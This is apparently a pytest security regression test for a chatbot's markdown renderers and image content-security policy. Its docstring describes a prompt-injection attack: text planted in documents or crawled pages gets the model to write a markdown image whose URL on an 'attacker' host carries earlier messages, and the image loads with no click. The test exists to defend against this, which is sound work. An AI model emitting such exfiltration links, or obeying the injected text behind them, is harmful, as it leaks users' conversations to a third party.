"""S4: an image in a bot answer is never loaded.

react-markdown rendered ``![](https://attacker/?q=<earlier messages>)`` as an
``<img>`` that loads with no click: in the visitor's browser (widget) and
when an admin opens the transcript (console). Injected text in a document
or crawled page can ask the model to write exactly that, which sends the
conversation somewhere other than the model endpoint.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
RENDERERS = [
    "widget/src/components/BotMessage.tsx",
    "ui/components/conversations/MarkdownBubble.tsx",
]


@pytest.mark.parametrize("path", RENDERERS)
def test_markdown_renderers_replace_images_with_alt_text(path):
    src = (REPO / path).read_text()
    assert "<ReactMarkdown" in src
    m = re.search(r"^\s*img:\s*\((.*)$", src, re.M)
    assert m, f"{path} must override img"
    assert "<img" not in m.group(0) and "src" not in m.group(0)


def test_only_these_files_render_markdown():
    hits = []
    for base in ("ui/app", "ui/components", "widget/src"):
        for f in (REPO / base).rglob("*.tsx"):
            if "react-markdown" in f.read_text():
                hits.append(str(f.relative_to(REPO)))
    assert sorted(hits) == sorted(RENDERERS)


def test_admin_img_src_follows_icon_hosts(monkeypatch, tmp_path):
    from services.ui_csp import ui_policy_for_file

    page = tmp_path / "index.html"
    page.write_text("<html><script>1</script></html>")

    monkeypatch.delenv("WIDGET_ICON_HOSTS", raising=False)
    assert "img-src 'self' data: blob: https:;" in ui_policy_for_file(page)

    monkeypatch.setenv("WIDGET_ICON_HOSTS", "cdn.corp.example, *.assets.example:8443")
    policy = ui_policy_for_file(page)
    img = next(d for d in policy.split(";") if d.strip().startswith("img-src"))
    assert img.split()[1:] == ["'self'", "data:", "blob:", "https://cdn.corp.example",
                               "https://*.assets.example:8443"]
